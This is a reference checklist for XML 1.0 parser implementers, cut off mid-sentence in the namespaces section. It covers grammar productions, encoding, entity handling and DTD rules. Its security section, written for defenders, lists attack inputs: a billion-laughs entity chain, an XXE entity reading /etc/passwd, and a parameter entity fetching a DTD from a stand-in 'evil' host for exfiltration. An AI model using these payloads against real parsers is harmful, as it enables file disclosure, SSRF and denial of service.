# XML 1.0 implementer's reference

A checklist of the exact rules and the edge cases that trip implementations, compiled from:

- **XML 1.0 Fifth Edition** (W3C REC, 26 Nov 2008, <https://www.w3.org/TR/REC-xml/>). Production numbers
  `[1]`..`[89]` and section numbers `§x.y` point into it unless marked otherwise.
- **Namespaces in XML 1.0 Third Edition** (<https://www.w3.org/TR/xml-names/>), cited as `NS [n]` / `NS §x`.
- **XML 1.1 Second Edition** and **Namespaces in XML 1.1 Second Edition**, for the differences only (section 12 below).
- The XML Information Set, xml:id, xml-stylesheet, and the W3C conformance suite (`xmlts20130923`,
  <https://www.w3.org/XML/Test/>) including James Clark's canonical form (section 14 below). Bare `§` numbers in this
  document are spec sections; "section N" means a section of this document.

The grammar is normative; the prose adds well-formedness constraints (WFC), validity constraints (VC),
and plain MUST rules. Where this document says **fatal**, a conforming processor must report it and stop
normal processing (§1.2 "fatal error"). Note the grammar's `A - B` operator: `Name - 'xml'` excludes only
strings matching B exactly, not strings that contain it.

## 1. Document structure (§2.1, §2.8)

```
[1]  document     ::= prolog element Misc*
[22] prolog       ::= XMLDecl? Misc* (doctypedecl Misc*)?
[23] XMLDecl      ::= '<?xml' VersionInfo EncodingDecl? SDDecl? S? '?>'
[24] VersionInfo  ::= S 'version' Eq ("'" VersionNum "'" | '"' VersionNum '"')
[25] Eq           ::= S? '=' S?
[26] VersionNum   ::= '1.' [0-9]+
[27] Misc         ::= Comment | PI | S
[32] SDDecl       ::= S 'standalone' Eq (("'" ('yes' | 'no') "'") | ('"' ('yes' | 'no') '"'))
[80] EncodingDecl ::= S 'encoding' Eq ('"' EncName '"' | "'" EncName "'")
[81] EncName      ::= [A-Za-z] ([A-Za-z0-9._] | '-')*
```

- Exactly one root element; before it only the XML declaration, comments, PIs, whitespace and one
  doctype; after it only comments, PIs and whitespace. No text, CDATA, references or second element
  outside the root. `&#32;` after the root is fatal: `Misc` allows literal `S` only.
- **The XML declaration must be the very first thing** (after an optional BOM). Leading whitespace,
  a comment or anything else before it makes `<?xml ...?>` a PI whose target is the reserved name
  `xml`, which is fatal ([17]). Without an XML declaration the document is XML 1.0 (it SHOULD have one,
  §2.8; for XML 1.1 it is REQUIRED).
- Pseudo-attributes are fixed: `version` (required), then `encoding`, then `standalone`, in that order,
  each preceded by at least one `S`. Lowercase keywords; each value quoted with matching `'` or `"`
  (quotes may differ between pseudo-attributes). `S` is allowed around `=` and before `?>`.
  Fatal: reordering, repeats, unknown pseudo-attributes, `standalone="YES"`, `version="1"`,
  `version="2.0"`, `encoding=""`, `encoding="8bit"` (EncName starts with a letter).
- `VersionNum` matches any `1.x`: a 1.0 processor processes `1.1`, `1.5`, `1.10` documents **as 1.0**
  and accepts them if they use no non-1.0 feature (§2.8 note). XML 1.0 documents SHOULD NOT specify any other version.
- `standalone` (§2.9) says whether external markup declarations (external subset or any parameter
  entity, even internal) affect the infoset. Only effects on a parser: it makes **Entity Declared** a
  WFC (section 7.6) and forces processing of declarations after an unread PE reference (section 7.2). Its VC
  (Standalone Document Declaration) is for validators.
- The doctype must precede the root; only one ([22]).

## 2. Characters, whitespace, names (§2.2, §2.3)

```
[2]  Char          ::= #x9 | #xA | #xD | [#x20-#xD7FF] | [#xE000-#xFFFD] | [#x10000-#x10FFFF]
[3]  S             ::= (#x20 | #x9 | #xD | #xA)+
[4]  NameStartChar ::= ":" | [A-Z] | "_" | [a-z] | [#xC0-#xD6] | [#xD8-#xF6] | [#xF8-#x2FF]
                     | [#x370-#x37D] | [#x37F-#x1FFF] | [#x200C-#x200D] | [#x2070-#x218F]
                     | [#x2C00-#x2FEF] | [#x3001-#xD7FF] | [#xF900-#xFDCF] | [#xFDF0-#xFFFD]
                     | [#x10000-#xEFFFF]
[4a] NameChar      ::= NameStartChar | "-" | "." | [0-9] | #xB7 | [#x0300-#x036F] | [#x203F-#x2040]
[5]  Name ::= NameStartChar (NameChar)*     [6] Names   ::= Name (#x20 Name)*
[7]  Nmtoken ::= (NameChar)+                [8] Nmtokens ::= Nmtoken (#x20 Nmtoken)*
```

- **Any code point outside `Char` anywhere in any entity is fatal**, literal or via `&#...;`: U+0000,
  C0 controls other than TAB/LF/CR, surrogates U+D800-DFFF, U+FFFE, U+FFFF. C1 controls
  (U+0080-009F, including NEL U+0085), U+007F, noncharacters U+FDD0-FDEF and U+xFFFE/F on other planes
  are **legal** (discouraged, §2.2 note). U+10FFFF is legal.
- `S` is exactly four characters. NBSP, NEL (1.0), U+2028, U+FEFF are not whitespace. Literal CR
  never reaches `S` (§2.11); `&#13;` in an entity value is the only way.
- Names use the **Fifth Edition ranges** (a coarse blocklist of Unicode ranges, stable across Unicode
  versions; ASCII table lookup plus ~16 range compares). Excluded among others: `×` U+D7, `÷` U+F7,
  U+037E (Greek question mark), U+2000-206F except ZWNJ/ZWJ and U+203F-2040, U+2190-2BFF, U+2FF0-3000,
  U+E000-F8FF (private use), U+FDD0-FDEF, U+F0000+. Digits, `-`, `.`, `·` U+B7 and combining marks
  U+0300-036F cannot start a name. Characters above U+FFFF (U+10000-EFFFF) are name characters: they
  were not before the 5th edition (conformance tests carry `EDITION`, section 14).
- Appendix B (`[84]`..`[89]` Letter/BaseChar/Ideographic/CombiningChar/Digit/Extender) is **orphaned**
  in the 5th edition; do not implement it.
- Names starting with `xml` in any case are reserved (§2.3) but **legal** (`<xmlfoo/>`, `<?xml-foo?>`).
  Only the PI target exactly matching `[Xx][Mm][Ll]` is excluded by the grammar.
- The colon is a legal name character in plain XML 1.0; Namespaces restrict it (section 9).
- `match` (§1.2) is code-point equality: no case folding, no Unicode normalization.

## 3. Encoding (§4.3.3, Appendix F)

- Processors **MUST** read UTF-8 and UTF-16 (§2.2, §4.3.3). "UTF-16" means the BOM-signed form; the
  labels UTF-16BE/LE and CESU-8 are "other" encodings.
- BOM (U+FEFF as signature, not content): UTF-16 entities **MUST** start with one; UTF-8 **MAY**. If an
  external entity's replacement text itself begins with U+FEFF and there is no text declaration, a BOM
  must precede it. A U+FEFF anywhere later (including a second leading BOM) is an ordinary character:
  in the prolog that is fatal (not `S`), in content it is text.
- Autodetection (Appendix F.1, non-normative but universal). With a BOM: `EF BB BF` UTF-8;
  `FE FF ## ##` UTF-16BE; `FF FE ## ##` UTF-16LE (`##` = not both zero); `00 00 FE FF` / `FF FE 00 00` /
  `00 00 FF FE` / `FE FF 00 00` UCS-4 in orders 1234/4321/2143/3412. Without a BOM:
  `00 00 00 3C`, `3C 00 00 00`, `00 00 3C 00`, `00 3C 00 00` 32-bit; `00 3C 00 3F` 16-bit BE;
  `3C 00 3F 00` 16-bit LE; `3C 3F 78 6D` (`<?xm`) ASCII-compatible (then read the declaration);
  `4C 6F A7 94` EBCDIC; anything else: UTF-8 with no declaration.
- Without external information (HTTP/MIME), it is **fatal** (§4.3.3):
  - for an entity with an encoding declaration to be in a different encoding than declared
    (a UTF-16 BOM followed by `encoding="UTF-8"`, or BOM-less UTF-8 bytes declaring `UTF-16`);
  - for an entity with neither BOM nor declaration to be anything but UTF-8;
  - to contain byte sequences illegal in its encoding: for UTF-8, any ill-formed sequence per Unicode
    §3.9 (overlong forms, encoded surrogates `ED A0 80`, > U+10FFFF, truncated sequences, stray
    continuation bytes);
  - to use an encoding the processor cannot process (so `encoding="EBCDIC-cp-us"` is a clean fatal
    error, not a guess).
- Encoding names SHOULD be matched case-insensitively and interpreted as the IANA-registered encoding
  (§4.3.3). Other encodings are optional. Practical subset beyond the mandatory two: `US-ASCII`,
  `ISO-8859-1` (real-world labels also say `latin1`), `windows-1252` (legacy tooling mislabels it as
  ISO-8859-1; WHATWG maps one to the other, the XML spec does not), maybe `ISO-8859-15`. Decoding into
  UTF-8 up front keeps one parser core. A declared single-byte encoding cannot be "illegal" except for
  undefined bytes (e.g. 0x81 in windows-1252).
- The declaration itself is ASCII in all supported families, so it can be read before switching
  decoders. A mismatch like `encoding="ISO-8859-1"` on a file that begins `EF BB BF` is fatal
  (libxml2 prefers the BOM and only warns; choose deliberately).
- Text declaration (§4.3.1, external entities only): `[77] TextDecl ::= '<?xml' VersionInfo?
  EncodingDecl S? '?>'` (version optional, **encoding required**, no standalone); only at the start of
  an external parsed entity, never produced by a reference; not part of the replacement text. A
  TextDecl anywhere else is fatal.

## 4. End-of-line handling (§2.11)

- Before parsing, every **external parsed entity including the document entity** behaves as if `CR LF`
  and any `CR` not followed by `LF` were replaced by one `LF`. This applies everywhere: text, CDATA,
  comments, PIs, attribute values, DTD literals. `a\r\r\nb` is `a\n\nb`.
- It does **not** apply to characters produced by character references: `&#13;` yields a real CR in
  text, attribute values and entity replacement text. It is not re-normalized when such an entity is
  expanded.
- Line and column numbers for error locations should count after this normalization (a CRLF is one
  line break).

## 5. Elements and attributes (§3.1, §3.3.3)

```
[39] element      ::= EmptyElemTag | STag content ETag     [WFC: Element Type Match]
[40] STag         ::= '<' Name (S Attribute)* S? '>'       [WFC: Unique Att Spec]
[41] Attribute    ::= Name Eq AttValue                     [WFC: No External Entity References]
                                                           [WFC: No < in Attribute Values]
[42] ETag         ::= '</' Name S? '>'
[43] content      ::= CharData? ((element | Reference | CDSect | PI | Comment) CharData?)*
[44] EmptyElemTag ::= '<' Name (S Attribute)* S? '/>'      [WFC: Unique Att Spec]
[10] AttValue     ::= '"' ([^<&"] | Reference)* '"' | "'" ([^<&'] | Reference)* "'"
```

- No whitespace after `<` or `</`; whitespace required between attributes (`b="1"c="2"` is fatal);
  optional around `=` and before `>` / `/>`; `/>` is one token. End tag `</a >` is fine, `</ a>` is not.
- **Element Type Match**: end-tag name equals start-tag name exactly (case-sensitive).
- **Unique Att Spec**: an attribute name at most once per tag (raw names; namespaces add section 9 rules).
  Attribute order is not significant (§3.1). With many attributes a naive O(n²) check is a DoS vector:
  hash above a small threshold.
- Attribute values: always quoted; literal `<` is fatal; `&` must start a reference; the other quote
  and `>` are fine; `]]>` is fine in an attribute value (the `]]>` rule is content-only).
- **No < in Attribute Values**: the replacement text of any entity referenced directly or indirectly
  in an attribute value (including defaults in ATTLIST) must not contain `<`. `&lt;` is fine because
  its replacement text is the character reference `&#60;` (§4.6).
- **No External Entity References**: attribute values must not reference external entities, directly
  or indirectly. Fatal even for non-validating processors (the declaration is enough to know).
- It is an **error** (not fatal) if an attribute value references an entity for which no declaration
  has been read (§3.3.3 end), the unread-external-subset case; otherwise Entity Declared applies.

### Attribute-value normalization (§3.3.3)

Starting from the EOL-normalized literal, build the value:

1. Character reference: append the referenced character **as-is** (so `&#9;`, `&#10;`, `&#13;`
   survive as TAB, LF, CR).
2. Entity reference: recursively apply this step to the entity's replacement text (so whitespace
   *inside replacement text*, including whitespace created by char refs in the entity value, becomes
   `#x20`).
3. Literal whitespace (`#x20 #xD #xA #x9`): append `#x20`. A CRLF in source is one space (EOL first).
4. Any other character: append it.

If the declared type is **not CDATA** (ID, IDREF(S), ENTITY/ENTITIES, NMTOKEN(S), NOTATION,
enumeration), then also strip leading/trailing `#x20` and collapse runs of `#x20` to one. Only `#x20`:
a TAB from `&#9;` is neither stripped nor collapsed. **Attributes with no declaration read are treated
as CDATA** (SHOULD), so without a DTD there is never any trimming. The §3.3.3 table:
`<!ENTITY d "&#xD;"> <!ENTITY a "&#xA;"> <!ENTITY da "&#xD;&#xA;">`:
`a="\n\nxyz"` → CDATA `"  xyz"`, NMTOKENS `"xyz"`; `a="&d;&d;A&a;&#x20;&a;B&da;"` → CDATA
`"  A   B  "`, NMTOKENS `"A B"`; `a="&#xd;&#xd;A&#xa;&#xa;B&#xd;&#xa;"` → `"\r\rA\n\nB\r\n"` for both.

## 6. Character data and markup (§2.4 – §2.7, §4.1, §4.6)

```
[14] CharData ::= [^<&]* - ([^<&]* ']]>' [^<&]*)
[15] Comment  ::= '<!--' ((Char - '-') | ('-' (Char - '-')))* '-->'
[16] PI       ::= '<?' PITarget (S (Char* - (Char* '?>' Char*)))? '?>'
[17] PITarget ::= Name - (('X' | 'x') ('M' | 'm') ('L' | 'l'))
[18] CDSect   ::= CDStart CData CDEnd    [19] CDStart ::= '<![CDATA['
[20] CData    ::= (Char* - (Char* ']]>' Char*))    [21] CDEnd ::= ']]>'
[66] CharRef  ::= '&#' [0-9]+ ';' | '&#x' [0-9a-fA-F]+ ';'   [WFC: Legal Character]
[67] Reference ::= EntityRef | CharRef
[68] EntityRef ::= '&' Name ';'  [WFC: Entity Declared] [VC: Entity Declared]
                                 [WFC: Parsed Entity] [WFC: No Recursion]
[69] PEReference ::= '%' Name ';'  [VC: Entity Declared] [WFC: No Recursion] [WFC: In DTD]
```

- **`]]>` in character data is fatal** (write `]]&gt;`). `]]`, `]>` and a lone `>` are fine. The rule
  also binds entity replacement text used in content (it must match `content`).
- Literal `<` and `&` only as markup delimiters, or inside comments, PIs, CDATA (§2.4).
- **Comments**: `--` must not occur inside; `--->` is fatal (§2.5 example); `<!---->` (empty) is legal;
  `<!--->` is fatal. No references or PE references are recognized inside. Comments are allowed
  everywhere `Misc` is, in content and in the DTD between declarations; never inside a tag or a
  declaration. The processor MAY expose comment text.
- **PIs**: the target is a `Name`; if data follows it must be separated by `S`. `<?pi?>` (no data) is
  legal; `<?pi?x?>` is fatal. The whitespace after the target is not part of the data (infoset);
  trailing whitespace before `?>` is. Target `xml` in any case combination is fatal anywhere except as
  the XML/text declaration; `xml-stylesheet` is legal. PIs MUST be passed to the application.
- **CDATA sections**: only in content (not prolog, not attributes, not DTD); keyword uppercase; no
  nesting; the first `]]>` ends them (`<![CDATA[]]]]>` holds `]]`). EOL normalization applies inside.
  Content is plain character data (infoset has no CDATA boundaries; keep them for round trips).
- **Character references**: `&#x` must be lowercase `x` (`&#X41;` is fatal); hex digits either case;
  at least one digit; leading zeros are fine (`&#0000065;` is `A`); guard against overflow on very long
  digit strings. **Legal Character**: the target must match `Char`: `&#0;`, `&#x1;`, `&#xD800;`,
  `&#xFFFE;`, `&#x110000;` are fatal. The result is **always data**, never re-parsed as markup:
  `&#60;` in content is a literal `<` (§4.6).
- **Predefined entities** `amp lt gt apos quot` must be recognized whether declared or not (§4.6). If
  declared, `lt` and `amp` must be internal entities whose replacement text is a char ref (double
  escaped: `<!ENTITY lt "&#38;#60;">`, `<!ENTITY amp "&#38;#38;">`); `gt apos quot` may be the character
  or a char ref. A wrong declaration is an **error** (not a WFC); keep the built-in meaning.

## 7. The DTD (§2.8, §3.2 – §3.4, §4.2 – §4.7)

### 7.1 Grammar

```
[28]  doctypedecl  ::= '<!DOCTYPE' S Name (S ExternalID)? S? ('[' intSubset ']' S?)? '>'
                       [VC: Root Element Type] [WFC: External Subset]
[28a] DeclSep      ::= PEReference | S                 [WFC: PE Between Declarations]
[28b] intSubset    ::= (markupdecl | DeclSep)*
[29]  markupdecl   ::= elementdecl | AttlistDecl | EntityDecl | NotationDecl | PI | Comment
                       [VC: Proper Declaration/PE Nesting] [WFC: PEs in Internal Subset]
[30]  extSubset    ::= TextDecl? extSubsetDecl
[31]  extSubsetDecl ::= ( markupdecl | conditionalSect | DeclSep)*
[45]  elementdecl  ::= '<!ELEMENT' S Name S contentspec S? '>'
[46]  contentspec  ::= 'EMPTY' | 'ANY' | Mixed | children
[47]  children ::= (choice | seq) ('?' | '*' | '+')?   [48] cp ::= (Name | choice | seq) ('?' | '*' | '+')?
[49]  choice ::= '(' S? cp ( S? '|' S? cp )+ S? ')'   [50] seq ::= '(' S? cp ( S? ',' S? cp )* S? ')'
[51]  Mixed ::= '(' S? '#PCDATA' (S? '|' S? Name)* S? ')*' | '(' S? '#PCDATA' S? ')'
[52]  AttlistDecl  ::= '<!ATTLIST' S Name AttDef* S? '>'
[53]  AttDef       ::= S Name S AttType S DefaultDecl
[54]  AttType ::= StringType | TokenizedType | EnumeratedType     [55] StringType ::= 'CDATA'
[56]  TokenizedType ::= 'ID' | 'IDREF' | 'IDREFS' | 'ENTITY' | 'ENTITIES' | 'NMTOKEN' | 'NMTOKENS'
[57]  EnumeratedType ::= NotationType | Enumeration
[58]  NotationType ::= 'NOTATION' S '(' S? Name (S? '|' S? Name)* S? ')'
[59]  Enumeration  ::= '(' S? Nmtoken (S? '|' S? Nmtoken)* S? ')'
[60]  DefaultDecl  ::= '#REQUIRED' | '#IMPLIED' | (('#FIXED' S)? AttValue)
                       [WFC: No < in Attribute Values] [WFC: No External Entity References]
[61]  conditionalSect ::= includeSect | ignoreSect
[62]  includeSect  ::= '<![' S? 'INCLUDE' S? '[' extSubsetDecl ']]>'
[63]  ignoreSect   ::= '<![' S? 'IGNORE' S? '[' ignoreSectContents* ']]>'
[64]  ignoreSectContents ::= Ignore ('<![' ignoreSectContents ']]>' Ignore)*
[65]  Ignore       ::= Char* - (Char* ('<![' | ']]>') Char*)
[70]  EntityDecl ::= GEDecl | PEDecl
[71]  GEDecl ::= '<!ENTITY' S Name S EntityDef S? '>'   [72] PEDecl ::= '<!ENTITY' S '%' S Name S PEDef S? '>'
[73]  EntityDef ::= EntityValue | (ExternalID NDataDecl?)  [74] PEDef ::= EntityValue | ExternalID
[9]   EntityValue ::= '"' ([^%&"] | PEReference | Reference)* '"' | "'" ([^%&'] | PEReference | Reference)* "'"
[75]  ExternalID ::= 'SYSTEM' S SystemLiteral | 'PUBLIC' S PubidLiteral S SystemLiteral
[76]  NDataDecl  ::= S 'NDATA' S Name
[11]  SystemLiteral ::= ('"' [^"]* '"') | ("'" [^']* "'")
[12]  PubidLiteral  ::= '"' PubidChar* '"' | "'" (PubidChar - "'")* "'"
[13]  PubidChar ::= #x20 | #xD | #xA | [a-zA-Z0-9] | [-'()+,./:=?;!*#@$_%]
[82]  NotationDecl ::= '<!NOTATION' S Name S (ExternalID | PublicID) S? '>'
[83]  PublicID ::= 'PUBLIC' S PubidLiteral
```

- Keywords are uppercase and case-sensitive (`<!doctype` is fatal). A doctype `PUBLIC` needs both
  literals; only `NOTATION` allows a public ID alone. `SystemLiteral` is not scanned for markup; a
  `#fragment` in it is an error (not fatal). Public IDs are compared after collapsing whitespace.
- The four WFCs of the DTD:
  - **PEs in Internal Subset**: in the internal subset, PE references may appear only *between*
    declarations (`DeclSep`), never inside one (`<!ENTITY e "%p;">`, `<!ELEMENT a %m;>` are fatal
    there). Allowed inside declarations in the external subset and external PEs.
  - **PE Between Declarations**: a PE referenced as `DeclSep` must expand to whole declarations
    (`extSubsetDecl`).
  - **External Subset**: the external subset must match `extSubset`.
  - **In DTD**: PE references must not appear outside the DTD (in content `%p;` is just text, §4.4.1).
- **Conditional sections are forbidden in the internal subset** (fatal), allowed in the external
  subset and external PEs (even when those are referenced from the internal subset). Ignored sections
  track nested `<![` / `]]>` only; PE references are not recognized inside. `INCLUDE` inside `IGNORE`
  is ignored. The keyword may come from a PE (`<![%draft;[`).
- Comments and PIs are allowed between declarations; PE references are not recognized in literals,
  comments, PIs or ignored sections (§2.8), but are recognized in entity values.
- If both subsets exist, the **internal subset is processed first**, so its entity and attlist
  declarations win (§2.8).
- Duplicate declarations: **first entity declaration binds** (§4.2; warning at user option).
  Multiple ATTLISTs for an element merge; **first definition of an attribute binds** (§3.3). Duplicate
  ELEMENT or NOTATION declarations are VCs only.
- Content models must be deterministic (Appendix E) but that is a compatibility error for validators;
  a non-validating parser only needs to parse the syntax.

### 7.2 What a non-validating processor must and must not do (§5.1, §5.2)

- Must check the **document entity including the entire internal subset** for well-formedness, and
  any other entity it chooses to read.
- Must **process every declaration it reads** in the internal subset and in PEs it reads, **up to the
  first reference to a PE it does not read**. It must use them to normalize attributes (declared
  types, section 5), **supply default attribute values** (§3.3.2, these become part of the infoset with
  `[specified]=false`), and **include internal entity replacement text**.
- After an unread PE reference it **MUST NOT process** further ENTITY or ATTLIST declarations (they
  could have been overridden), **unless `standalone="yes"`**, in which case it MUST process them. It
  still has to parse them for well-formedness. (Conformance test `valid-sa-097`: the ATTLIST after
  `%e;` does not apply.)
- Need not read the external subset or external entities. If it does not include an external parsed
  entity it **must tell the application it recognized but did not read it** (§4.4.3; expat's
  "skipped entity", libxml2's entity-reference node).
- Must pass **notations** (name, public/system IDs) and, for ENTITY/ENTITIES attributes, the unparsed
  entity and its notation (§4.7, infoset App. B). Validators must also report element-content
  whitespace; non-validators need not.

### 7.3 Entity kinds and the §4.4 treatment table

General entities (`&n;`, content) and parameter entities (`%n;`, DTD) live in **separate namespaces**.
Internal = literal `EntityValue`; external = `ExternalID`; unparsed = external with `NDATA` (general
only). The required behavior by context:

| Context | Parameter | Internal general | External parsed general | Unparsed | Character ref |
|---|---|---|---|---|---|
| Reference in content | Not recognized | Included | Included if validating | Forbidden | Included |
| Reference in attribute value | Not recognized | Included in literal | Forbidden | Forbidden | Included |
| Occurs as attribute value (ENTITY/ENTITIES name) | Not recognized | Forbidden | Forbidden | Notify | Not recognized |
| Reference in EntityValue | Included in literal | Bypassed | Bypassed | Error | Included |
| Reference in DTD (outside literals) | Included as PE | Forbidden | Forbidden | Forbidden | Forbidden |

- *Included* (§4.4.2): the replacement text is parsed in place, markup recognized (`AT&amp;T;` gives
  `AT&T;` with no second reference).
- *Included in literal* (§4.4.5): as included, but a `'` or `"` in the replacement text is data and
  never terminates the literal: `<!ENTITY % YN '"Yes"'> <!ENTITY WhatHeSaid "He said %YN;">` is fine;
  `<!ENTITY EndAttr "27'"> <element attribute='a-&EndAttr;>` is fatal.
- *Bypassed* (§4.4.7): a general entity reference in an entity value is left as-is (and need not be
  declared yet).
- *Included as PE* (§4.4.8): replacement text gets **one leading and one trailing space**, so a PE
  always yields whole tokens. Not applied inside entity values.
- *Forbidden* (§4.4.4, fatal): unparsed entity references anywhere but in an EntityValue (where it is
  merely an *Error*, §4.4.9); character or general-entity references in the DTD outside EntityValue
  and AttValue; external entity references in attribute values.

### 7.4 Replacement text construction (§4.5, Appendix D)

- **Internal entity**: replacement text = the literal value with **character references and PE
  references expanded now**, and **general entity references left unexpanded**. The replacement text
  is later **re-parsed** where included, so markup built from char refs becomes live markup.
- **External entity**: replacement text = the file content minus the text declaration, with nothing
  expanded.
- References must be wholly inside the literal.
- Appendix D worked example: `<!ENTITY example "<p>An ampersand (&#38;#38;) may be escaped numerically
  (&#38;#38;#38;) or with a general entity (&amp;amp;).</p>">` stores
  `<p>An ampersand (&#38;) may be escaped numerically (&#38;#38;) or with a general entity (&amp;amp;).</p>`;
  `&example;` in content yields a `p` element with text
  `An ampersand (&) may be escaped numerically (&#38;) or with a general entity (&amp;).`
- The "tricky" example: `<!ENTITY % xx '&#37;zz;'> <!ENTITY % zz '&#60;!ENTITY tricky "error-prone" >'> %xx;`
  declares `tricky` = `error-prone` (xx stores `%zz;`, which is not rescanned at declaration time but is
  recognized when `%xx;` is included in the DTD).
- `<!ENTITY x "&lt;"> ... <foo attr="&x;"/>` is well-formed (replacement `&lt;`, then `&#60;`);
  `<!ENTITY x "&#60;">` with the same use is not (replacement is `<`).
- Well-formed parsed entities (§4.3.2): an internal general entity's replacement text must match
  `content` [43]; an external one `extParsedEnt ::= TextDecl? content` [78]. Consequence: tags,
  comments, PIs, references, CDATA sections cannot start in one entity and end in another. `<!ENTITY e
  "<b>">` is legal to declare; using `&e;` is fatal. Only entities that are actually referenced must be
  well-formed.
- A literal `<` in an entity value is legal in the declaration (`<!ENTITY mylt "<">`) but every use is
  fatal (§2.3 note).

### 7.5 No Recursion, Parsed Entity

- **No Recursion**: a parsed entity must not reference itself directly or indirectly, general
  (`<!ENTITY a "&b;"> <!ENTITY b "&a;">` then `&a;`) or parameter. Detect with an "entity being
  expanded" flag or stack, not with a depth limit alone. Declaring an unused recursive pair is not
  diagnosed by most parsers (only referenced entities must be well-formed).
- **Parsed Entity**: `&n;` must not name an unparsed (NDATA) entity; those are only named in
  ENTITY/ENTITIES attribute values.

### 7.6 Entity Declared (WFC and VC, §4.1)

The WFC applies only in three kinds of documents: **(a) no DTD, (b) only an internal subset with no PE
references, or (c) `standalone="yes"`**. There, every general entity reference outside the external
subset/PEs must match a declaration that is itself outside the external subset/PEs, except the five
predefined ones; and **a general entity must be declared before any reference to it in an ATTLIST
default value**. In every other document (an external subset or any PE reference, standalone absent
or `no`) an undeclared entity is **only a VC**: a non-validating parser must not treat it as fatal.
Consequences:

- `<a>&e;</a>` with no DTD: fatal.
- `<!DOCTYPE a SYSTEM "x.dtd"><a>&e;</a>` (not read): not fatal; report `e` as skipped/unexpanded.
  This is the XHTML `&nbsp;` and SVG 1.1 DTD case.
- The same with `standalone="yes"`: fatal.
- Even an **internal** PE reference downgrades it (errata E13: `<!DOCTYPE foo [<!ENTITY % pe
  "<!ENTITY ent1 'text'>"> %pe;]><foo>&ent2;</foo>` is merely invalid).
- An undeclared **parameter** entity is never a WFC ([69] lists only the VC). The PE's declaration must
  precede its reference (VC wording).

### 7.7 Attribute defaults (§3.3.2)

- `#REQUIRED`, `#IMPLIED`, a default value, or `#FIXED` value. Defaults read by the processor MUST be
  reported for elements that omit the attribute. Default values are normalized with the declared
  type; they are subject to No `<` and No External Entity References (WFC), and entity references in
  them must be declared first.
- Defaults can add **namespace declarations** (`<!ATTLIST svg xmlns CDATA #FIXED "...">`, the SVG 1.1
  DTD does exactly this plus `xlink:type`/`xlink:show`/`xlink:actuate` defaults): namespace
  resolution must run after defaulting, and reading external DTDs changes the tree.

### 7.8 Validity constraints (for reference; validation is presumed out of scope)

Root Element Type; Proper Declaration/PE Nesting; Standalone Document Declaration; Element Valid;
Attribute Value Type; Unique Element Type Declaration; Proper Group/PE Nesting; No Duplicate Types;
ID; One ID per Element Type; ID Attribute Default; IDREF; Entity Name; Name Token; Notation Attributes;
One Notation Per Element Type; No Notation on Empty Element; No Duplicate Tokens; Enumeration;
Required Attribute; Attribute Default Value Syntactically Correct; Fixed Attribute Default; Proper
Conditional Section/PE Nesting; Entity Declared; Notation Declared; Unique Notation Name (26 total).
A non-validating processor still depends on the *declarations* behind several of these: declared
attribute types (normalization), defaults and `#FIXED` values (infoset), ID type (for `getElementById`
style lookups, and xml:id), and the Entity Declared split above.

## 8. Security-relevant behavior

- **Billion laughs** (exponential): `<!ENTITY a "lol"> <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"> ...`
  ten levels deep → 10⁹ copies from < 1 KB. **Quadratic blowup**: one 100 KB entity referenced 100 000
  times; no nesting at all, so depth limits miss it. Also through **attribute values** and **ATTLIST
  defaults** applied to every element (a known libxml2 bug class). Defenses: count every expanded byte
  (content and attribute values) against both an absolute cap and an amplification ratio
  (expanded/input), cap entity nesting depth, and expand lazily or store expansions by reference.
- **XXE**: `<!ENTITY x SYSTEM "file:///etc/passwd">` → local file disclosure; `http://` → SSRF;
  `<!ENTITY % r SYSTEM "http://evil/x.dtd"> %r;` → out-of-band exfiltration via PE tricks. **DTD
  retrieval** alone (SVG 1.1, XHTML DTDs) causes network traffic and hangs; W3C throttles DTD fetches.
- Reference defaults:
  - **libxml2** (2.15 here): no external DTD load without `XML_PARSE_DTDLOAD`; no entity substitution
    (keeps entity-ref nodes) without `XML_PARSE_NOENT`, which also loads external entities;
    `XML_PARSE_NONET`, `XML_PARSE_NO_XXE` (2.13+). Limits unless `XML_PARSE_HUGE`: depth 256 (2048
    huge), text node/attribute 10 000 000 bytes (`XML_MAX_TEXT_LENGTH`), name 50 000
    (`XML_MAX_NAME_LENGTH`), entity amplification factor 5 (`XML_MAX_AMPLIFICATION_DEFAULT`,
    `xmlCtxtSetMaxAmplification`, 2.11+; each expansion also costs a fixed 20 bytes,
    `XML_ENT_FIXED_COST`), entity nesting depth 20 (40 with `XML_PARSE_HUGE`). libxml2 and expat
    figures checked in the sources pinned by `bench/compare/fetch.sh`; the .NET ones are from its
    documentation.
  - **expat** (2.8.x here): never fetches anything itself (external entities go to a callback;
    `XML_SetParamEntityParsing` defaults to `NEVER`, so the external subset is not read); undeclared
    entities go to the skipped-entity handler; billion-laughs protection (2.4.0+) with maximum
    amplification 100.0 and activation threshold 8 MiB; allocation tracker (2.7.2+), amplification 100
    after 64 MiB; reparse deferral (2.6.0+) against quadratic rescanning of huge tokens during
    streaming.
  - **.NET** `XmlReader`: `DtdProcessing = Prohibit` by default (a DOCTYPE is an error),
    `XmlResolver = null` (no fetching), `MaxCharactersFromEntities = 10 000 000`,
    `MaxCharactersInDocument = 0` (unlimited).
- Suggested defaults: parse the internal subset and expand internal entities (needed for SVG), never
  open files or sockets (external IDs go to an optional resolver callback, off by default), expansion
  cap plus ratio, max depth, max attributes per element, max name/text/attribute length, max
  namespace declarations, max input size. XInclude off. Every limit breach is a located error.

## 9. Namespaces (Namespaces in XML 1.0, 3rd ed.)

```
NS [1] NSAttName ::= PrefixedAttName | DefaultAttName
NS [2] PrefixedAttName ::= 'xmlns:' NCName    [NSC: Reserved Prefixes and Namespace Names]
NS [3] DefaultAttName  ::= 'xmlns'
NS [4] NCName ::= Name - (Char* ':' Char*)
NS [7] QName ::= PrefixedName | UnprefixedName   [8] PrefixedName ::= Prefix ':' LocalPart
NS [9] UnprefixedName ::= LocalPart   [10] Prefix ::= NCName   [11] LocalPart ::= NCName
NS [15] Attribute ::= NSAttName Eq AttValue | QName Eq AttValue
        [NSC: Prefix Declared] [NSC: No Prefix Undeclaring] [NSC: Attributes Unique]
```

- **Scope** (NS §6.1): from the start of the start-tag to the end of the matching end-tag, so
  `<p:a xmlns:p="u"/>` and `<a p:x="1" xmlns:p="u"/>` are fine. Process all `xmlns*` attributes of a
  tag (including DTD defaults) before resolving that tag's names. Inner declarations shadow outer.
- **Default namespace** (`xmlns="u"`) applies to unprefixed **element** names only. **Unprefixed
  attributes are in no namespace**, never the default one. `xmlns=""` resets to no default namespace
  (legal in 1.0).
- The namespace name is the **normalized attribute value** (entities and char refs expanded,
  section 5): `xmlns="&ns_svg;"` binds to the entity's text. Comparison is exact string equality: no case
